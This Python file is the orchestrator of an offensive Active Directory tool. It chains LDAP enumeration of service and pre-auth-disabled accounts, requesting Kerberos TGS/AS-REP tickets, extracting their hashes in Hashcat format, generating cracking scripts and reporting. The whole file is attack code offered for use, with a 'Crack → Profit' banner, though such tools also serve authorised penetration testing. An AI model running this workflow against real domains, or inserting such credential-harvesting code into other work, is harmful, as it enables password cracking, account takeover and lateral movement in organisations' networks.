"""
KerberoastFramework — Main orchestrator for the complete
Kerberoasting & AS-REP Roasting workflow.

Coordinates: LDAP enumeration → Hash extraction → Cracking prep → Reporting
"""

from pathlib import Path
from typing import List

from .target import RoastingTarget
from .enumerator import LDAPEnumerator
from ..extractors.kerberoast import KerberoastExtractor
from ..extractors.asreproast import ASREPExtractor
from ..utils.analysis import PasswordAgeAnalyzer
from ..utils.cracking import CrackingManager
from ..utils.reporting import ReportGenerator
from ..utils.commands import CommandReference


class KerberoastFramework:
    """
    Complete Kerberoasting & AS-REP Roasting Framework.

    Workflow:
        1. Enumerate targets via LDAP
        2. Prioritize by privilege level and password age
        3. Request TGS/AS-REP tickets
        4. Extract hashes in Hashcat format
        5. Generate cracking commands
        6. Validate cracked passwords
    """

    def __init__(
        self,
        domain: str,
        username: str,
        password: str = "",
        ntlm_hash: str = "",
        dc_ip: str = None,
        output_dir: str = "roasting",
    ):
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.dc_ip = dc_ip or domain
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)

        # State
        self.targets: List[RoastingTarget] = []
        self.kerberoastable: List[RoastingTarget] = []
        self.asreproastable: List[RoastingTarget] = []
        self.hashes: List[str] = []

        # Sub-components
        self.enumerator = LDAPEnumerator(domain, username, password, self.dc_ip)
        self.kerb_extractor = KerberoastExtractor(
            domain, username, password, ntlm_hash, self.dc_ip, self.output_dir
        )
        self.asrep_extractor = ASREPExtractor(
            domain, username, password, self.dc_ip, self.output_dir
        )
        self.analyzer = PasswordAgeAnalyzer()
        self.cracker = CrackingManager(domain, self.output_dir)
        self.reporter = ReportGenerator(domain, self.output_dir)

        self._print_banner()

    def _print_banner(self):
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║          KERBEROASTING & AS-REP ROASTING FRAMEWORK          ║
║                                                              ║
║  Enumerate → Request → Extract → Crack → Profit              ║
╚══════════════════════════════════════════════════════════════╝
[+] Domain:    {self.domain}
[+] DC:        {self.dc_ip}
[+] User:      {self.username}
[+] Output:    {self.output_dir}
        """)

    def run_full_roast(self) -> bool:
        """Execute the complete roasting workflow."""
        print(f"\n{'#' * 60}")
        print(f"# KERBEROASTING & AS-REP ROASTING — FULL WORKFLOW")
        print(f"# Target: {self.domain}")
        print(f"{'#' * 60}")

        if not self.enumerator.connect():
            CommandReference.print_alternatives(
                self.domain, self.username, self.password, self.dc_ip
            )
            return False

        # Phase 1: Enumerate
        self.kerberoastable = self.enumerator.enumerate_kerberoastable()
        self.asreproastable = self.enumerator.enumerate_asreproastable()
        self.targets = self.kerberoastable + self.asreproastable
        self.analyzer.analyze(self.targets)

        # Phase 2: Extract
        if self.kerberoastable:
            self.hashes.extend(self.kerb_extractor.extract(self.kerberoastable))
        if self.asreproastable:
            self.hashes.extend(self.asrep_extractor.extract(self.asreproastable))

        # Phase 3: Crack
        if self.hashes:
            self.cracker.prepare(self.hashes)

        # Phase 4: Validate + Report
        CommandReference.print_validation(self.domain, self.dc_ip)
        self.reporter.generate(
            self.targets, self.kerberoastable, self.asreproastable, self.hashes
        )

        self._print_completion()
        return True

    def run_enumerate_only(self):
        """Enumerate targets without extracting hashes."""
        if not self.enumerator.connect():
            return

        self.kerberoastable = self.enumerator.enumerate_kerberoastable()
        self.asreproastable = self.enumerator.enumerate_asreproastable()
        self.targets = self.kerberoastable + self.asreproastable

        self.analyzer.analyze(self.targets)
        self.reporter.generate(
            self.targets, self.kerberoastable, self.asreproastable, self.hashes
        )

    def _print_completion(self):
        print(f"\n{'=' * 60}")
        print("ROASTING COMPLETE")
        print(f"{'=' * 60}")
        print(f"[+] Hashes extracted: {len(self.hashes)}")
        print(f"[+] Run: bash {self.output_dir}/cracking_strategy.sh")